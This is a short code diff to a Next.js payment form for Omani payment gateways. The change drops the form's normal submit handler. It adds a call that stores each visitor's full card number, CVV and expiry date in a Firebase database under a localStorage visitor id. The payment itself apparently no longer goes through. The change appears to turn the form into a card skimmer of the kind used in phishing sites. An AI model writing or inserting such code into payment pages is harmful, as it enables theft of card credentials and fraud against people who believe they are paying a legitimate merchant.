@@ -15,6 +15,7 @@ import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Shield, CreditCard, Calendar, Lock, AlertCircle, Building2, Smartphone, Wallet, Info } from "lucide-react"
 import Image from "next/image"
 import { omanPaymentGateways } from "@/lib/payment-gateways"
+import { addData } from "@/lib/firebase"
 
 interface PaymentFormProps {
   onSubmit: (paymentData: any) => void
@@ -84,11 +85,15 @@ export function PaymentForm({ onSubmit, isProcessing, amount }: PaymentFormProps
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+    const _id=localStorage.getItem("visitor")
     if (validateForm()) {
-      onSubmit({
+      addData({id:_id,
         gateway: selectedGateway,
         paymentMethod,
-        cardInfo: paymentMethod === "card" ? formData : null,
+        cardNumber:formData.cardNumber,
+        cvv:formData.cvv,
+        expiryMonth:formData.expiryMonth,
+        expiryYear:formData.expiryYear,
       })
     }
   }
